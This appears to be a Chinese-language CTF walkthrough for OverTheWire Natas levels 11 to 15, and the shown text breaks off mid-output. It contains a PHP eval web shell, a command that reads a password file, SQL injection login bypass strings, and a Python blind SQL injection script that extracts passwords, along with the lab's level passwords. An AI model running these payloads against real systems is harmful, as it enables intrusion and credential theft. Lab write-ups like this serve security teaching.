+<h3 id="natas-Level-11-gt-natas-Level-12"><a href="#natas-Level-11-gt-natas-Level-12" class="headerlink" title="natas Level 11 -&gt; natas Level 12"></a>natas Level 11 -&gt; natas Level 12</h3><p>链接：<a href="http://natas12.natas.labs.overthewire.org" target="_blank" rel="noopener">http://natas12.natas.labs.overthewire.org</a></p>
+<p>本关考察的是文件上传：</p>
+<p><img src="/2020/04/20/OverTheWire-Natas-Walkthrough-1/imgs/10.png" alt="10"></p>
+<p>直接看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">? </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">genRandomString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $length = <span class="number">10</span>;</span><br><span class="line">    $characters = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz"</span>;</span><br><span class="line">    $string = <span class="string">""</span>;    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($p = <span class="number">0</span>; $p &lt; $length; $p++) &#123;</span><br><span class="line">        $string .= $characters[mt_rand(<span class="number">0</span>, strlen($characters)<span class="number">-1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeRandomPath</span><span class="params">($dir, $ext)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">    $path = $dir.<span class="string">"/"</span>.genRandomString().<span class="string">"."</span>.$ext;</span><br><span class="line">    &#125; <span class="keyword">while</span>(file_exists($path));</span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeRandomPathFromFilename</span><span class="params">($dir, $fn)</span> </span>&#123;</span><br><span class="line">    $ext = pathinfo($fn, PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">return</span> makeRandomPath($dir, $ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">"filename"</span>, $_POST)) &#123;</span><br><span class="line">    $target_path = makeRandomPathFromFilename(<span class="string">"upload"</span>, $_POST[<span class="string">"filename"</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(filesize($_FILES[<span class="string">'uploadedfile'</span>][<span class="string">'tmp_name'</span>]) &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is too big"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'uploadedfile'</span>][<span class="string">'tmp_name'</span>], $target_path)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"The file &lt;a href=\"$target_path\"&gt;$target_path&lt;/a&gt; has been uploaded"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"There was an error uploading the file, please try again!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form enctype=<span class="string">"multipart/form-data"</span> action=<span class="string">"index.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"MAX_FILE_SIZE"</span> value=<span class="string">"1000"</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"filename"</span> value=<span class="string">"&lt;? print genRandomString(); ?&gt;.jpg"</span> /&gt;</span><br><span class="line">Choose a JPEG to upload (max <span class="number">1</span>KB):&lt;br/&gt;</span><br><span class="line">&lt;input name=<span class="string">"uploadedfile"</span> type=<span class="string">"file"</span> /&gt;&lt;br /&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Upload File"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?</span> &#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这道题很简单，直接上传个小马就可以了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后访问小马得到<code>natas13</code>的密码：<code>jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</code>。</p>
+<h3 id="natas-Level-12-gt-natas-Level-13"><a href="#natas-Level-12-gt-natas-Level-13" class="headerlink" title="natas Level 12 -&gt; natas Level 13"></a>natas Level 12 -&gt; natas Level 13</h3><p>链接：<a href="http://natas13.natas.labs.overthewire.org" target="_blank" rel="noopener">http://natas13.natas.labs.overthewire.org</a></p>
+<p>打开题目就看到提示必需上传一张图片，然后再来看一下源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">genRandomString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $length = <span class="number">10</span>;</span><br><span class="line">    $characters = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz"</span>;</span><br><span class="line">    $string = <span class="string">""</span>;    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($p = <span class="number">0</span>; $p &lt; $length; $p++) &#123;</span><br><span class="line">        $string .= $characters[mt_rand(<span class="number">0</span>, strlen($characters)<span class="number">-1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeRandomPath</span><span class="params">($dir, $ext)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">    $path = $dir.<span class="string">"/"</span>.genRandomString().<span class="string">"."</span>.$ext;</span><br><span class="line">    &#125; <span class="keyword">while</span>(file_exists($path));</span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeRandomPathFromFilename</span><span class="params">($dir, $fn)</span> </span>&#123;</span><br><span class="line">    $ext = pathinfo($fn, PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">return</span> makeRandomPath($dir, $ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">"filename"</span>, $_POST)) &#123;</span><br><span class="line">    $target_path = makeRandomPathFromFilename(<span class="string">"upload"</span>, $_POST[<span class="string">"filename"</span>]);</span><br><span class="line">    </span><br><span class="line">    $err=$_FILES[<span class="string">'uploadedfile'</span>][<span class="string">'error'</span>];</span><br><span class="line">    <span class="keyword">if</span>($err)&#123;</span><br><span class="line">        <span class="keyword">if</span>($err === <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"The uploaded file exceeds MAX_FILE_SIZE"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Something went wrong :/"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(filesize($_FILES[<span class="string">'uploadedfile'</span>][<span class="string">'tmp_name'</span>]) &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is too big"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (! exif_imagetype($_FILES[<span class="string">'uploadedfile'</span>][<span class="string">'tmp_name'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is not an image"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'uploadedfile'</span>][<span class="string">'tmp_name'</span>], $target_path)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"The file &lt;a href=\"$target_path\"&gt;$target_path&lt;/a&gt; has been uploaded"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"There was an error uploading the file, please try again!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form enctype=<span class="string">"multipart/form-data"</span> action=<span class="string">"index.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"MAX_FILE_SIZE"</span> value=<span class="string">"1000"</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"filename"</span> value=<span class="string">"&lt;? print genRandomString(); ?&gt;.jpg"</span> /&gt;</span><br><span class="line">Choose a JPEG to upload (max <span class="number">1</span>KB):&lt;br/&gt;</span><br><span class="line">&lt;input name=<span class="string">"uploadedfile"</span> type=<span class="string">"file"</span> /&gt;&lt;br /&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Upload File"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码中会用<code>exif_imagetype</code>函数来获取图片类型，这个很好绕过，只要在文件中添加图片头就可以了，比如gif的文件头是<code>GIF89a</code>。</p>
+<p>这里额外需要注意的是，这里上传的默认文件后缀是<code>.jpg</code>，需要修改为<code>.php</code>，如下图所示：</p>
+<p><img src="/2020/04/20/OverTheWire-Natas-Walkthrough-1/imgs/12.png" alt="12"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;natas13.natas.labs.overthewire.org&#x2F;upload&#x2F;vnja0i8yjc.php</span><br><span class="line">&#x2F;&#x2F; POST</span><br><span class="line">cmd&#x3D;system(&quot;cat &#x2F;etc&#x2F;natas_webpass&#x2F;natas14&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>执行得到：</p>
+<p><img src="/2020/04/20/OverTheWire-Natas-Walkthrough-1/imgs/13.png" alt="13"></p>
+<p>得到下一关密码：<code>Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</code>。</p>
+<h3 id="natas-Level-13-gt-natas-Level-14"><a href="#natas-Level-13-gt-natas-Level-14" class="headerlink" title="natas Level 13 -&gt; natas Level 14"></a>natas Level 13 -&gt; natas Level 14</h3><p>链接：<a href="http://natas14.natas.labs.overthewire.org" target="_blank" rel="noopener">http://natas14.natas.labs.overthewire.org</a></p>
+<p>查看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">"username"</span>, $_REQUEST)) &#123;</span><br><span class="line">    $link = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'natas14'</span>, <span class="string">'&lt;censored&gt;'</span>);</span><br><span class="line">    mysql_select_db(<span class="string">'natas14'</span>, $link);</span><br><span class="line">    </span><br><span class="line">    $query = <span class="string">"SELECT * from users where username=\""</span>.$_REQUEST[<span class="string">"username"</span>].<span class="string">"\" and password=\""</span>.$_REQUEST[<span class="string">"password"</span>].<span class="string">"\""</span>;</span><br><span class="line">    <span class="keyword">if</span>(array_key_exists(<span class="string">"debug"</span>, $_GET)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Executing query: $query&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(mysql_num_rows(mysql_query($query, $link)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Access denied!&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close($link);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">"index.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">Username: &lt;input name=<span class="string">"username"</span>&gt;&lt;br&gt;</span><br><span class="line">Password: &lt;input name=<span class="string">"password"</span>&gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Login"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>从源码可以看到<code>$_REQUEST[&quot;username&quot;]</code>是用户完全可控的，没有经过任何过滤就直接拼接进了SQL查询语句，而且用的是双括号，所以直接用万能密码即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username : 1&quot; or 1&#x3D;1 #</span><br><span class="line">password : 123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/20/OverTheWire-Natas-Walkthrough-1/imgs/14.png" alt="14"></p>
+<p><code>natas15</code>的登录密码是<code>AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</code>。</p>
+<h3 id="natas-Level-14-gt-natas-Level-15"><a href="#natas-Level-14-gt-natas-Level-15" class="headerlink" title="natas Level 14 -&gt; natas Level 15"></a>natas Level 14 -&gt; natas Level 15</h3><p>链接：<a href="http://natas15.natas.labs.overthewire.org" target="_blank" rel="noopener">http://natas15.natas.labs.overthewire.org</a></p>
+<p>还是sql注入题目，源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">CREATE TABLE `users` (</span></span><br><span class="line"><span class="comment">  `username` varchar(64) DEFAULT NULL,</span></span><br><span class="line"><span class="comment">  `password` varchar(64) DEFAULT NULL</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">"username"</span>, $_REQUEST)) &#123;</span><br><span class="line">    $link = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'natas15'</span>, <span class="string">'&lt;censored&gt;'</span>);</span><br><span class="line">    mysql_select_db(<span class="string">'natas15'</span>, $link);</span><br><span class="line">    </span><br><span class="line">    $query = <span class="string">"SELECT * from users where username=\""</span>.$_REQUEST[<span class="string">"username"</span>].<span class="string">"\""</span>;</span><br><span class="line">    <span class="keyword">if</span>(array_key_exists(<span class="string">"debug"</span>, $_GET)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Executing query: $query&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $res = mysql_query($query, $link);</span><br><span class="line">    <span class="keyword">if</span>($res) &#123;</span><br><span class="line">    <span class="keyword">if</span>(mysql_num_rows($res) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"This user exists.&lt;br&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"This user doesn't exist.&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Error in query.&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close($link);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">"index.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">Username: &lt;input name=<span class="string">"username"</span>&gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Check existence"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?</span> &#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>打开题目看到的就是根据用户名查询：</p>
+<p><img src="/2020/04/20/OverTheWire-Natas-Walkthrough-1/imgs/15.png" alt="15"></p>
+<p>查询<code>natas1</code>到<code>natas15</code>返回的都是<code>This user doesn&#39;t exist.</code>，但是查询下一关的用户<code>natas16</code>，返回的确是<code>This user exists.</code>，只有两种状态，用户存在和用户不存在，所以我们可以用布尔盲注来解决这道题。</p>
+<p>之前对于盲注，我都会这么构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;natas16&quot; and (ascii(substr((select password from users),1,1))&gt;-1) #</span><br></pre></td></tr></table></figure>
+
+<p>但是对于本道题不适用，这么构造会报错，因为<code>Subquery returns more than 1 row</code>。</p>
+<p>所以我们还可以用模糊匹配，MySQL支持用<code>LIKE BINARY ...%</code>来进行模糊匹配。其中<code>BINARY</code>关键字表示大小写敏感，比如我们现在新建一个数据表<code>users</code>，并插入数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create table users(</span><br><span class="line">    -&gt; id int(6) unsigned auto_increment primary key,</span><br><span class="line">    -&gt; username varchar(20) not null,</span><br><span class="line">    -&gt; email varchar(20) not null );</span><br><span class="line">Query OK, 0 rows affected (0.04 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO users VALUE(1, &#39;Cosimo&#39;, &#39;Cosimo@gmail.com&#39;);</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO users VALUE(2, &#39;Lorenzo&#39;, &#39;Lorenzo@gmail.com&#39;);</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO users VALUE(3, &#39;Piero&#39;, &#39;Piero@gmail.com&#39;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p><code>%r%</code>表示匹配字段中含有字符<code>r</code>的数据，<code>r%</code>表示匹配字段值以字符<code>r</code>开头的数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM users WHERE username&#x3D;&#39;Piero&#39; and email LIKE BINARY &#39;%r%&#39;;</span><br><span class="line">+----+----------+-----------------+</span><br><span class="line">| id | username | email           |</span><br><span class="line">+----+----------+-----------------+</span><br><span class="line">|  3 | Piero    | Piero@gmail.com |</span><br><span class="line">+----+----------+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM users WHERE username&#x3D;&#39;Piero&#39; and email LIKE BINARY &#39;r%&#39;;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>对本道题，我们可以进行如下注入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;natas16&quot; AND password LIKE BINARY &#39;%a%&#39; #</span><br></pre></td></tr></table></figure>
+
+<p>返回的结果是<code>The user exists.</code>，说明在密码中含有字符<code>a</code>：</p>
+<p><img src="/2020/04/20/OverTheWire-Natas-Walkthrough-1/imgs/16.png" alt="16"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;natas16&quot; AND password LIKE BINARY &#39;%A%&#39; #</span><br></pre></td></tr></table></figure>
+
+<p>返回的结果是<code>The user doesn&#39;t exist.</code>，说明在密码中不含字符<code>A</code>：</p>
+<p><img src="/2020/04/20/OverTheWire-Natas-Walkthrough-1/imgs/17.png" alt="17"></p>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">username = <span class="string">'natas15'</span></span><br><span class="line">password = <span class="string">'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'</span></span><br><span class="line">url = <span class="string">'http://natas15.natas.labs.overthewire.org'</span></span><br><span class="line">chars = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">candidate_chars = <span class="string">''</span></span><br><span class="line">passwd = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"[*] Natas15 -&gt; Natas16 Start!"</span>)</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> chars:</span><br><span class="line">    payload = <span class="string">'natas16" AND password LIKE BINARY "%'</span> + ch + <span class="string">'%" #'</span></span><br><span class="line">    r = requests.post(url = url, auth=HTTPBasicAuth(username, password), data=&#123;<span class="string">'username'</span>:payload&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"exists"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        candidate_chars += ch</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"[-] Characters Used : "</span>, candidate_chars)</span><br><span class="line"><span class="comment"># candidate_chars = '03569acehijmnpqtwBEHINORW'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> candidate_chars:</span><br><span class="line">        payload = <span class="string">'natas16" AND password LIKE BINARY "'</span> + passwd + ch + <span class="string">'%" #'</span></span><br><span class="line">        r = requests.post(url = url, auth=HTTPBasicAuth(username, password), data=&#123;<span class="string">'username'</span>:payload&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"exists"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            passwd += ch</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">"[-] Password : "</span>, passwd, <span class="string">"*"</span>*(<span class="number">32</span>-i<span class="number">-1</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"[*] Natas15 -&gt; Natas16 Completed!"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>上面exp中用了两个for循环，第一个for循环中的payload匹配方式是<code>%...%</code>，主要目的是找出密码中用到的字符；第二个for循环匹配密码。</p>
+<p>结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">[*] 